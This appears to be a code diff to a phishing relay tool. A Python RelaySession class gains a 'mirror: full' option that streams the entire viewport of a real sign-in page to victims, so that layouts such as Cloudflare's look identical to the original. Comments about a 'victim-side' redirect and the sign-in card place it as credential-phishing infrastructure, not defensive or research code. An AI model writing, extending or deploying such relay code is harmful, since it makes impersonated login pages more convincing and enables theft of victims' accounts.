@@ -409,6 +409,8 @@ class RelaySession(threading.Thread):
         self.classify_map = {k: [s.lower() for s in (v or [])]
                              for k, v in cl.items()}
         self.page_brand = dict(self.profile.get("page") or {})
+        if self.profile.get("mirror") == "full":
+            self.page_brand["mirror"] = "full"
         # victim-side done redirect falls back to the profile's reopen_url
         self.page_brand.setdefault("done_url",
                                    self.profile.get("reopen_url")
@@ -528,7 +530,11 @@ class RelaySession(threading.Thread):
     }"""
 
     def _card_box(self, pg):
-        """Bounding box of the white sign-in card (incl. logo + padding)."""
+        """Bounding box of the white sign-in card (incl. logo + padding).
+        Profiles with `mirror: full` stream the WHOLE viewport instead of the
+        card crop (2-column layouts like cloudflare look 1:1 with the origin)."""
+        if self.profile.get("mirror") == "full":
+            return {"x": 0, "y": 0, "width": self.vw, "height": self.vh}
         try:
             box = pg.evaluate(self.CARD_JS)
             if box and box.get("w", 0) > 250 and box.get("h", 0) > 150:
